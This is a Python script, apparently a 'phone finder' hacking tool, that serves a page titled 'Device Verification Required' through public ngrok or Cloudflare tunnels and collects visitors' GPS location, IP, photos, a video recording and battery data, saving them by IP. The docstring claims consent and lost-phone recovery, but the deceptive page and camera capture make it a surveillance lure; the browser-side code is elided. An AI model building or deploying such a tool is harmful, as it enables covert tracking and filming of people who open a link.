#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Enhanced version with camera, video recording, and comprehensive data collection
Use only to help recover your own lost/stolen phone. This script explicitly asks
a finder for permission before sending location. Do not use to deceive or coerce.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports, show friendly error if missing
try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing Python packages or modules. Install dependencies and try again.")
    print("Recommended install (copy-paste):")
    print("  pip install flask requests qrcode pillow colorama pyngrok")
    print("Error detail:", e)
    sys.exit(1)

colorama_init(autoreset=True)

# ----------------- Config -----------------
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "public_link_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

# Create necessary directories
os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

# ----------------- Enhanced HTML (unchanged) -----------------
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Device Verification Required</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>/* CSS same as before */</style>
</head>
<body>
<!-- HTML content same as before -->
</body>
</html>
"""

# ----------------- Flask endpoints -----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/youtube")
def youtube_redirect():
    return redirect("https://www.youtube.com")

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    lat = data.get("latitude")
    lon = data.get("longitude")
    ip = data.get("ip", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    region = data.get("region", "Unknown")
    photos_data = data.get("photos", [])
    video_data = data.get("video")
    browser_info = data.get("browser_info", {})

    # Save photos and video
    photo_filenames = []
    video_filename = None

    for i, photo_data in enumerate(photos_data):
        filename = save_photo(photo_data, ip, i+1)
        if filename:
            photo_filenames.append(filename)

    if video_data:
        video_filename = save_video(video_data, ip)

    rec = {
        "ts": datetime.now().isoformat(),
        "ip": ip,
        "city": city,
        "country": country,
        "region": region,
        "lat": float(lat) if lat else None,
        "lon": float(lon) if lon else None,
        "photos": photo_filenames,
        "video": video_filename,
        "browser_info": browser_info,
        "battery": browser_info.get('battery', 'Unknown')
    }
    _received_reports.append(rec)
    save_report_csv(rec)

    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎯 DEVICE DATA CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied")
    print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country})")
    print(f"{Fore.CYAN}📸 Photos: {len(photo_filenames)}")
    print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_filename else 'No'}")
    print(f"{Fore.CYAN}🔋 Battery: {browser_info.get('battery', 'Unknown')}")
    print(f"{Fore.RED}🔒 Tool locked - Starting YouTube redirect{Style.RESET_ALL}\n")

    return jsonify({"status": "success", "message": "TOOL LOCKED"})

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}_{int(time.time())}_{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(image_data)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving photo: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(video_binary)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving video: {e}{Style.RESET_ALL}")
        return None


# ----------------- NEW TOOL LOCK SEQUENCE -----------------
def final_tool_sequence():
    try:
        print(f"\n{Fore.RED}{Style.BRIGHT}🔒 TOOL LOCKED!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Starting countdown...{Style.RESET_ALL}\n")
        for i in range(9, 0, -1):
            print(f"{Fore.CYAN}{i}{Style.RESET_ALL}")
            time.sleep(1)

        print(f"\n{Fore.GREEN}🎬 Redirecting to YouTube app...{Style.RESET_ALL}")
        try:
            webbrowser.open("youtube://")
            time.sleep(2)
            webbrowser.open("https://youtube.com/@hackers_colony_tech")
        except Exception:
            print(f"{Fore.YELLOW}Couldn't open YouTube app, using browser fallback.{Style.RESET_ALL}")
            webbrowser.open("https://youtube.com/@hackers_colony_tech")

        input(f"\n{Fore.YELLOW}Press ENTER once you're back from YouTube...{Style.RESET_ALL}")

        os.system("clear" if os.name != "nt" else "cls")
        print(f"{Fore.CYAN}{Style.BRIGHT}\n===============================")
        print(f"     HCO PHONE FINDER")
        print(f"===============================")
        print(f"{Fore.WHITE}An Advanced Tool by {Fore.GREEN}Azhar{Style.RESET_ALL}\n")

        # Auto-detect tunnels
        ngrok_exists = os.system("command -v ngrok > /dev/null") == 0
        cloudflare_exists = os.system("command -v cloudflared > /dev/null") == 0

        if ngrok_exists and not cloudflare_exists:
            choice = "1"
        elif cloudflare_exists and not ngrok_exists:
            choice = "2"
        else:
            print(f"{Fore.YELLOW}Choose Tunnel Method:{Style.RESET_ALL}")
            print("1) Ngrok")
            print("2) Cloudflare")
            choice = input("\nEnter choice (1 or 2): ").strip()

        if choice == "1" and ngrok_exists:
            print(f"\n{Fore.GREEN}Starting Ngrok tunnel...{Style.RESET_ALL}")
            os.system("pkill ngrok > /dev/null 2>&1")
            os.system("ngrok http 5000 > /dev/null &")
            time.sleep(5)
            try:
                result = subprocess.check_output("curl -s localhost:4040/api/tunnels | grep -o 'https://[a-zA-Z0-9.-]*.ngrok-free.app'", shell=True)
                print(f"\n{Fore.CYAN}Public Link:{Style.RESET_ALL} {result.decode().strip()}")
            except Exception as e:
                print(f"{Fore.RED}Ngrok tunnel failed: {e}{Style.RESET_ALL}")

        elif choice == "2" and cloudflare_exists:
            print(f"\n{Fore.GREEN}Starting Cloudflare tunnel...{Style.RESET_ALL}")
            os.system("pkill cloudflared > /dev/null 2>&1")
            os.system("cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &")
            time.sleep(5)
            print(f"{Fore.CYAN}Visit your cloudflared terminal for the public link.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No tunnel tool detected. Please install ngrok or cloudflared.{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Tool closed by user.{Style.RESET_ALL}")


if __name__ == "__main__":
    # Run Flask app in background thread
    flask_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False))
    flask_thread.start()

    time.sleep(3)
    final_tool_sequence()
